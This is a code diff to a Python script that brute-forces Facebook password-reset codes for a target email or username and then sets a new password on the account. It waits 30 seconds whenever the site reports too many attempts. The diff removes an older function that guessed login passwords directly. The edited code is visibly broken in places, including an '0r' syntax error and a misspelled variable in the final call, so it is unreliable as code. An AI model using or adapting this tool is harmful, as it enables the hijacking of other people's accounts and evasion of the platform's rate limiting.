@@ -25,25 +25,6 @@ def setup_browser(self):
     browser.set_handle_refresh(False)
     return browser
 
-def send_login(self, email, password):
-    self.browser.open(self.LOGIN_URL)
-    self.browser.select_form(nr=0)
-    self.browser.form['email'] = email
-    self.browser.form['pass'] = password
-    return self.browser.submit().read()
-
-def try_password(self, email, password):
-    print ('Trying %s' % password)
-    data = self.send_login(email, password)
-
-    if self.is_too_often(data):
-        print ('Facebook says we\'re trying too often. Waiting 30 seconds.')
-        sleep(30)
-        self.try_password(password)
-
-    if self.is_logged_in(data):
-        print ('Password found: %s' % password )
-        sys.exit()
 def passcode(pass0):
   pass1 = int(pass0)
   pass2 = int(pass0)
@@ -75,7 +56,7 @@ def passcode(pass0):
     yo = str(pass1)
   return yo
 
-def fb_hack():
+def fb_hack(email, codex):
   os.system('clear')
   soup = BeautifulSoup()
   email = input('Email address or username to attack:')
@@ -99,8 +80,8 @@ def fb_hack():
   browser.submit()
   """reset code input"""
   browser.select_form(nr=0)
-  pass1 = 999999
-  browser.form['n'] = str(pass1)
+  y = int(codex)
+  browser.form['n'] = str(y)
   browser.submit()
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
@@ -111,20 +92,19 @@ def fb_hack():
   check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   if check1 != test:
     print(check1)
-    reset1 = input('Code:') or 999999
-    reset = int(reset1)
+    reset = int(codex)
   else:
     print(check2)
-    reset1 = input('Code: ') or 99999999
+    reset = int(codex)
   if check1 != test:
-    while check1 != test or reset > 99999:  
+    while check1 == check3:  
       browser.select_form(nr=0)
       y = passcode(reset)
       browser.form['n'] = y
       browser.submit()
       print(y, end='\r')
-      fail = (yo, "failed")
-      success = (yo, "succeded")
+      fail = (y, "failed")
+      success = (y, "succeded")
       s = " "
       reset = reset-1
       response1 = browser.response()
@@ -135,15 +115,15 @@ def fb_hack():
         sleep(30)
       else:
         print(s.join(success))
-  elif check2 != test:
-    while check2 != test or reset > 9999999:
+  elif check2 == check4:
+    while check2 == check4:
       browser.select_form(nr=0)
-      y = reset
-      browser.form['n'] = yo
+      y = passcode(reset)
+      browser.form['n'] = y
       browser.submit()
       print(str(y), end='\r')
-      fail = (yo, "failed")
-      success = (yo, "succeded")
+      fail = (y, "failed")
+      success = (y, "succeded")
       s = " "
       reset = reset-1
       response1 = browser.response()
@@ -165,6 +145,6 @@ def fb_hack():
       new = input('New Password: ')
       browser.select_form(nr=0)
       browser.form['password_new'] = new
-"""fb_hack()"""
-reset = input('code:')
-print(passcode(reset))
+ehack = input('Email address or username to attack:')
+reset = input('Code: ') 0r 99999999
+fb_hack(echack, reset)
